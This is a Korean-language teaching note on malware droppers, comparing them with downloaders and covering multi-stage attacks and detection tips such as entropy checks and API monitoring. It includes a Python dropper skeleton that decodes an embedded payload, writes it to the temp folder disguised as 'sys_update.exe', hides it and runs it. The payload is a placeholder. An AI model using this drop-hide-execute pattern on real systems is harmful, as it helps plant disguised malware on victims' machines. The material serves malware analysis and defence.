# 70620.1 드롭퍼 특징 및 다운로더 비교

## 1. 드롭퍼(Dropper)의 정의
드롭퍼는 그 자체로 악의적인 기능을 수행하기보다는, 내부에 암호화되거나 압축된 상태로 포함된 실제 악성코드(Payload)를 대상 시스템에 설치하고 실행하는 '운반체' 역할을 하는 악성코드입니다.

### 주요 특징
*   **자기 완결성:** 외부 네트워크 연결 없이도 페이로드를 실행할 수 있는 데이터를 내부에 포함하고 있는 경우가 많습니다.
*   **회피 중심 설계:** 실제 악성 행위는 페이로드가 수행하므로, 드롭퍼 자체는 탐지를 피하기 위해 정상 파일처럼 위장하거나 복잡한 난독화 기술을 사용합니다.
*   **권한 상승 및 환경 설정:** 페이로드가 원활하게 동작할 수 있도록 시스템 설정을 변경하거나 취약점을 이용해 권한을 획득하는 전처리 과정을 수행합니다.

## 2. 드롭퍼 vs 다운로더(Downloader) 비교

| 구분 | 드롭퍼 (Dropper) | 다운로더 (Downloader) |
| :--- | :--- | :--- |
| **페이로드 위치** | 악성코드 파일 내부에 포함 (Resource, Overlay 등) | 외부 C2 서버 또는 원격 저장소 |
| **네트워크 의존성** | 낮음 (네트워크 없이도 감염 가능) | 높음 (인터넷 연결 필수) |
| **파일 크기** | 상대적으로 큼 (페이로드 포함) | 매우 작음 (단순 다운로드 로직) |
| **주요 목적** | 페이로드 은닉 및 설치 자동화 | 페이로드 유연한 교체 및 유포 |
| **탐지 포인트** | 리소스 섹션, 엔트로피, 복호화 루틴 | 네트워크 통신(HTTP/HTTPS), API(URLDownloadToFile 등) |

## 3. 멀티 스테이지(Multi-stage) 실행 전략
현대적인 공격은 탐지를 최소화하기 위해 여러 단계를 거칩니다.

1.  **Stage 0 (Delivery):** 피싱 메일 등을 통해 드롭퍼 유포.
2.  **Stage 1 (Dropper/Loader):** 시스템 환경을 확인(샌드박스 우회 등)하고 내부에 숨겨진 페이로드를 복호화하여 메모리 또는 임시 디렉토리에 드롭.
3.  **Stage 2 (Payload):** 실제 악성 행위(정보 탈취, 랜섬웨어 실행 등) 수행.

### [Python] 심플 드롭퍼 개념 코드
아래 코드는 리소스에 포함된 데이터를 파일로 드롭하고 실행하는 기본 구조를 보여줍니다.

```python
import os
import subprocess
import base64

# 내부에 암호화/인코딩되어 저장된 페이로드 (예시)
ENCODED_PAYLOAD = "YmFzaDY0X2VuY29kZWRfcGF5bG9hZF9kYXRh" # 실제 실행 파일 데이터가 들어감

def drop_and_execute():
    try:
        # 1. 경로 설정 (임시 폴더 등)
        temp_path = os.path.join(os.environ['TEMP'], "sys_update.exe")
        
        # 2. 페이로드 복호화/디코딩
        payload_data = base64.b64decode(ENCODED_PAYLOAD)
        
        # 3. 파일 드롭
        with open(temp_path, "wb") as f:
            f.write(payload_data)
            
        # 4. 속성 숨김 처리 (Optional)
        subprocess.run(["attrib", "+h", temp_path], check=True)
        
        # 5. 실행
        subprocess.Popen(temp_path, shell=True)
        print(f"[+] Payload dropped and executed at: {temp_path}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    drop_and_execute()
```

## 4. 분석 전략 요약
*   **엔트로피 분석:** 파일의 특정 섹션이나 리소스의 엔트로피가 비정상적으로 높다면 암호화된 페이로드가 존재할 가능성이 큽니다.
*   **API 모니터링:** `CreateFile`, `WriteFile`, `WinExec`, `ShellExecute` 등의 호출을 추적하여 파일 생성 및 실행 행위를 감시합니다.
